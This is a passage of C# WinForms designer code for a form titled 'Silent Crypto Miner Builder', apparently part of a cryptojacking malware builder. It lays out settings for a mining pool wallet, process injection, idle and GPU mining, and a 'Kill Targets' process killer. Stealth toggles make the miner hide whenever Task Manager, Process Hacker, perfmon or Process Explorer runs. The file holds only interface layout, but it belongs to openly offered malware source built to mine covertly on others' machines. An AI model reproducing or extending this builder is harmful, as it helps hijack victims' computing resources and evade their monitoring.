            this.labelMinerXMRMiningGPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningGPU.Location = new System.Drawing.Point(10, 39);
            this.labelMinerXMRMiningGPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningGPU.Name = "labelMinerXMRMiningGPU";
            this.labelMinerXMRMiningGPU.Size = new System.Drawing.Size(80, 17);
            this.labelMinerXMRMiningGPU.TabIndex = 28;
            this.labelMinerXMRMiningGPU.Text = "GPU Mining:";
            // 
            // toggleGPU
            // 
            this.toggleGPU.BackColor = System.Drawing.Color.Transparent;
            this.toggleGPU.Checked = false;
            this.toggleGPU.ForeColor = System.Drawing.Color.Black;
            this.toggleGPU.Location = new System.Drawing.Point(130, 36);
            this.toggleGPU.Margin = new System.Windows.Forms.Padding(2);
            this.toggleGPU.Name = "toggleGPU";
            this.toggleGPU.Size = new System.Drawing.Size(50, 24);
            this.toggleGPU.TabIndex = 27;
            // 
            // labelMinerXMRMiningMaxCPU
            // 
            this.labelMinerXMRMiningMaxCPU.AutoSize = true;
            this.labelMinerXMRMiningMaxCPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningMaxCPU.Location = new System.Drawing.Point(253, 42);
            this.labelMinerXMRMiningMaxCPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningMaxCPU.Name = "labelMinerXMRMiningMaxCPU";
            this.labelMinerXMRMiningMaxCPU.Size = new System.Drawing.Size(64, 17);
            this.labelMinerXMRMiningMaxCPU.TabIndex = 25;
            this.labelMinerXMRMiningMaxCPU.Text = "Max CPU:";
            // 
            // txtIdleWait
            // 
            this.txtIdleWait.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIdleWait.Enabled = false;
            this.txtIdleWait.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtIdleWait.ForeColor = System.Drawing.Color.Silver;
            this.txtIdleWait.Location = new System.Drawing.Point(331, 95);
            this.txtIdleWait.MaxLength = 32767;
            this.txtIdleWait.MultiLine = false;
            this.txtIdleWait.Name = "txtIdleWait";
            this.txtIdleWait.Size = new System.Drawing.Size(24, 24);
            this.txtIdleWait.TabIndex = 51;
            this.txtIdleWait.Text = "5";
            this.txtIdleWait.TextAlignment = System.Windows.Forms.HorizontalAlignment.Right;
            this.txtIdleWait.UseSystemPasswordChar = false;
            this.txtIdleWait.WordWrap = false;
            // 
            // tabAdvanced
            // 
            this.tabAdvanced.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAdvanced.Controls.Add(this.toggleStealthFullscreen);
            this.tabAdvanced.Controls.Add(this.labelMinerXMRAdvancedStealthFullscreen);
            this.tabAdvanced.Controls.Add(this.chkAPI);
            this.tabAdvanced.Controls.Add(this.labelMinerXMRAdvancedKillTargets);
            this.tabAdvanced.Controls.Add(this.labelMinerXMRAdvancedStealthTargets);
            this.tabAdvanced.Controls.Add(this.chkAdvParam);
            this.tabAdvanced.Controls.Add(this.chkRemoteConfig);
            this.tabAdvanced.Controls.Add(this.txtAPI);
            this.tabAdvanced.Controls.Add(this.txtKillTargets);
            this.tabAdvanced.Controls.Add(this.txtStealthTargets);
            this.tabAdvanced.Controls.Add(this.txtAdvParam);
            this.tabAdvanced.Controls.Add(this.txtRemoteConfig);
            this.tabAdvanced.Location = new System.Drawing.Point(89, 4);
            this.tabAdvanced.Name = "tabAdvanced";
            this.tabAdvanced.Size = new System.Drawing.Size(418, 189);
            this.tabAdvanced.TabIndex = 7;
            this.tabAdvanced.Text = "Advanced";
            // 
            // toggleStealthFullscreen
            // 
            this.toggleStealthFullscreen.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealthFullscreen.Checked = false;
            this.toggleStealthFullscreen.ForeColor = System.Drawing.Color.Black;
            this.toggleStealthFullscreen.Location = new System.Drawing.Point(143, 40);
            this.toggleStealthFullscreen.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealthFullscreen.Name = "toggleStealthFullscreen";
            this.toggleStealthFullscreen.Size = new System.Drawing.Size(50, 24);
            this.toggleStealthFullscreen.TabIndex = 130;
            // 
            // labelMinerXMRAdvancedStealthFullscreen
            // 
            this.labelMinerXMRAdvancedStealthFullscreen.AutoSize = true;
            this.labelMinerXMRAdvancedStealthFullscreen.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRAdvancedStealthFullscreen.Location = new System.Drawing.Point(14, 43);
            this.labelMinerXMRAdvancedStealthFullscreen.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRAdvancedStealthFullscreen.Name = "labelMinerXMRAdvancedStealthFullscreen";
            this.labelMinerXMRAdvancedStealthFullscreen.Size = new System.Drawing.Size(130, 17);
            this.labelMinerXMRAdvancedStealthFullscreen.TabIndex = 131;
            this.labelMinerXMRAdvancedStealthFullscreen.Text = "Stealth on Fullscreen:";
            // 
            // chkAPI
            // 
            this.chkAPI.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAPI.BackColor = System.Drawing.Color.Transparent;
            this.chkAPI.Checked = false;
            this.chkAPI.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAPI.ForeColor = System.Drawing.Color.Black;
            this.chkAPI.Location = new System.Drawing.Point(227, 68);
            this.chkAPI.Margin = new System.Windows.Forms.Padding(2);
            this.chkAPI.Name = "chkAPI";
            this.chkAPI.Size = new System.Drawing.Size(178, 24);
            this.chkAPI.TabIndex = 129;
            this.chkAPI.Text = "API Endpoint URL";
            this.chkAPI.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAPI_CheckedChanged);
            // 
            // labelMinerXMRAdvancedKillTargets
            // 
            this.labelMinerXMRAdvancedKillTargets.AutoSize = true;
            this.labelMinerXMRAdvancedKillTargets.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerXMRAdvancedKillTargets.ForeColor = System.Drawing.Color.Gray;
            this.labelMinerXMRAdvancedKillTargets.Location = new System.Drawing.Point(14, 133);
            this.labelMinerXMRAdvancedKillTargets.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRAdvancedKillTargets.Name = "labelMinerXMRAdvancedKillTargets";
            this.labelMinerXMRAdvancedKillTargets.Size = new System.Drawing.Size(75, 17);
            this.labelMinerXMRAdvancedKillTargets.TabIndex = 125;
            this.labelMinerXMRAdvancedKillTargets.Text = "Kill Targets:";
            // 
            // labelMinerXMRAdvancedStealthTargets
            // 
            this.labelMinerXMRAdvancedStealthTargets.AutoSize = true;
            this.labelMinerXMRAdvancedStealthTargets.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerXMRAdvancedStealthTargets.ForeColor = System.Drawing.Color.Gray;
            this.labelMinerXMRAdvancedStealthTargets.Location = new System.Drawing.Point(14, 77);
            this.labelMinerXMRAdvancedStealthTargets.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRAdvancedStealthTargets.Name = "labelMinerXMRAdvancedStealthTargets";
            this.labelMinerXMRAdvancedStealthTargets.Size = new System.Drawing.Size(97, 17);
            this.labelMinerXMRAdvancedStealthTargets.TabIndex = 121;
            this.labelMinerXMRAdvancedStealthTargets.Text = "Stealth Targets:";
            // 
            // chkAdvParam
            // 
            this.chkAdvParam.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAdvParam.BackColor = System.Drawing.Color.Transparent;
            this.chkAdvParam.Checked = false;
            this.chkAdvParam.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAdvParam.ForeColor = System.Drawing.Color.Black;
            this.chkAdvParam.Location = new System.Drawing.Point(227, 124);
            this.chkAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.chkAdvParam.Name = "chkAdvParam";
            this.chkAdvParam.Size = new System.Drawing.Size(178, 24);
            this.chkAdvParam.TabIndex = 111;
            this.chkAdvParam.Text = "Advanced Parameters";
            this.chkAdvParam.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAdvParam_CheckedChanged);
            // 
            // chkRemoteConfig
            // 
            this.chkRemoteConfig.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkRemoteConfig.BackColor = System.Drawing.Color.Transparent;
            this.chkRemoteConfig.Checked = false;
            this.chkRemoteConfig.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkRemoteConfig.ForeColor = System.Drawing.Color.Black;
            this.chkRemoteConfig.Location = new System.Drawing.Point(227, 12);
            this.chkRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.chkRemoteConfig.Name = "chkRemoteConfig";
            this.chkRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.chkRemoteConfig.TabIndex = 115;
            this.chkRemoteConfig.Text = "Remote Configuration";
            this.chkRemoteConfig.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkRemoteConfig_CheckedChanged);
            // 
            // txtAPI
            // 
            this.txtAPI.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAPI.Enabled = false;
            this.txtAPI.ForeColor = System.Drawing.Color.Silver;
            this.txtAPI.Location = new System.Drawing.Point(227, 96);
            this.txtAPI.Margin = new System.Windows.Forms.Padding(2);
            this.txtAPI.MaxLength = 32767;
            this.txtAPI.MultiLine = false;
            this.txtAPI.Name = "txtAPI";
            this.txtAPI.Size = new System.Drawing.Size(178, 24);
            this.txtAPI.TabIndex = 128;
            this.txtAPI.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAPI.UseSystemPasswordChar = false;
            this.txtAPI.WordWrap = false;
            // 
            // txtKillTargets
            // 
            this.txtKillTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtKillTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtKillTargets.Location = new System.Drawing.Point(15, 152);
            this.txtKillTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtKillTargets.MaxLength = 32767;
            this.txtKillTargets.MultiLine = false;
            this.txtKillTargets.Name = "txtKillTargets";
            this.txtKillTargets.Size = new System.Drawing.Size(178, 24);
            this.txtKillTargets.TabIndex = 122;
            this.txtKillTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtKillTargets.UseSystemPasswordChar = false;
            this.txtKillTargets.WordWrap = false;
            // 
            // txtStealthTargets
            // 
            this.txtStealthTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStealthTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtStealthTargets.Location = new System.Drawing.Point(15, 96);
            this.txtStealthTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtStealthTargets.MaxLength = 32767;
            this.txtStealthTargets.MultiLine = false;
            this.txtStealthTargets.Name = "txtStealthTargets";
            this.txtStealthTargets.Size = new System.Drawing.Size(178, 24);
            this.txtStealthTargets.TabIndex = 118;
            this.txtStealthTargets.Text = "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe";
            this.txtStealthTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStealthTargets.UseSystemPasswordChar = false;
            this.txtStealthTargets.WordWrap = false;
            // 
            // txtAdvParam
            // 
            this.txtAdvParam.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAdvParam.Enabled = false;
            this.txtAdvParam.ForeColor = System.Drawing.Color.Silver;
            this.txtAdvParam.Location = new System.Drawing.Point(227, 152);
            this.txtAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.txtAdvParam.MaxLength = 32767;
            this.txtAdvParam.MultiLine = false;
            this.txtAdvParam.Name = "txtAdvParam";
            this.txtAdvParam.Size = new System.Drawing.Size(178, 24);
            this.txtAdvParam.TabIndex = 110;
            this.txtAdvParam.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAdvParam.UseSystemPasswordChar = false;
            this.txtAdvParam.WordWrap = false;
            // 
            // txtRemoteConfig
            // 
            this.txtRemoteConfig.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtRemoteConfig.Enabled = false;
            this.txtRemoteConfig.ForeColor = System.Drawing.Color.Silver;
            this.txtRemoteConfig.Location = new System.Drawing.Point(227, 40);
            this.txtRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.txtRemoteConfig.MaxLength = 32767;
            this.txtRemoteConfig.MultiLine = false;
            this.txtRemoteConfig.Name = "txtRemoteConfig";
            this.txtRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.txtRemoteConfig.TabIndex = 114;
            this.txtRemoteConfig.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtRemoteConfig.UseSystemPasswordChar = false;
            this.txtRemoteConfig.WordWrap = false;
            // 
            // tabJSON
            // 
            this.tabJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabJSON.Controls.Add(this.txtJSON);
            this.tabJSON.Location = new System.Drawing.Point(89, 4);
            this.tabJSON.Name = "tabJSON";
            this.tabJSON.Size = new System.Drawing.Size(418, 189);
            this.tabJSON.TabIndex = 8;
            this.tabJSON.Text = "JSON";
            // 
            // txtJSON
            // 
            this.txtJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtJSON.ForeColor = System.Drawing.Color.Silver;
            this.txtJSON.Location = new System.Drawing.Point(3, 3);
            this.txtJSON.MaxLength = 32767;
            this.txtJSON.MultiLine = true;
            this.txtJSON.Name = "txtJSON";
            this.txtJSON.Size = new System.Drawing.Size(412, 183);
            this.txtJSON.TabIndex = 0;
            this.txtJSON.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtJSON.UseSystemPasswordChar = false;
            this.txtJSON.WordWrap = false;
            // 
            // MinerXMR
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formMinerXMR);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "MinerXMR";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MinerXMR_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formMinerXMR.ResumeLayout(false);
            this.tabcontrolMinerXMR.ResumeLayout(false);
            this.tabConnection.ResumeLayout(false);
            this.tabConnection.PerformLayout();
            this.tabMining.ResumeLayout(false);
            this.tabMining.PerformLayout();
            this.tabAdvanced.ResumeLayout(false);
            this.tabAdvanced.PerformLayout();
            this.tabJSON.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        internal MephTheme formMinerXMR;
        internal MephTabcontrol tabcontrolMinerXMR;
        internal TabPage tabConnection;
        internal LinkLabel labelWiki;
        internal Label labelMinerXMRConnectionHelp;
        internal Label labelMinerXMRConnectionInjection;
        internal MephComboBox comboInjection;
        internal Label labelMinerXMRConnectionPool;
        internal MephTextBox txtPoolUsername;
        internal MephTextBox txtPoolURL;
        internal Label labelMinerXMRConnectionWallet;
        internal Label labelMinerXMRConnectionPassword;
        internal MephTextBox txtPoolPassword;
        internal TabPage tabMining;
        internal Label labelMinerXMRMiningStealth;
        internal MephToggleSwitch toggleStealth;
        internal Label labelMinerXMRMiningWaitMinutes;
        internal Label labelMinerXMRMiningIdleWait;
        internal MephTextBox txtIdleWait;
        internal MephComboBox comboIdleCPU;
        internal MephComboBox comboMaxCPU;
        internal Label labelMinerXMRMiningIdleCPU;
        internal Label labelMinerXMRMiningSSL;
        internal MephToggleSwitch toggleSSL;
        internal Label labelMinerXMRMiningCPU;
        internal MephToggleSwitch toggleCPU;
        internal Label labelMinerXMRMiningNicehash;
        internal MephToggleSwitch toggleNicehash;
        internal Label labelMinerXMRMiningIdleMining;
        internal Label labelMinerXMRMiningGPU;
        internal MephToggleSwitch toggleGPU;
        internal Label labelMinerXMRMiningMaxCPU;
        internal TabPage tabAdvanced;
        internal MephCheckBox chkRemoteConfig;
        internal MephTextBox txtRemoteConfig;
        internal MephToggleSwitch toggleIdle;
        internal Label labelMinerXMRAdvancedKillTargets;
        internal MephTextBox txtKillTargets;
        internal Label labelMinerXMRAdvancedStealthTargets;
        internal MephTextBox txtStealthTargets;
        internal MephCheckBox chkAdvParam;
        internal MephTextBox txtAdvParam;
        internal Label labelMinerXMRMiningAlgorithm;
        internal MephComboBox comboAlgorithm;
        internal MephCheckBox chkAPI;
        internal MephTextBox txtAPI;
        internal Label labelMinerXMRMiningProcessKiller;
        internal MephToggleSwitch toggleProcessKiller;
        private TabPage tabJSON;
        private MephTextBox txtJSON;
        internal Label labelMinerXMRAdvancedStealthFullscreen;
        internal MephToggleSwitch toggleStealthFullscreen;
    }
}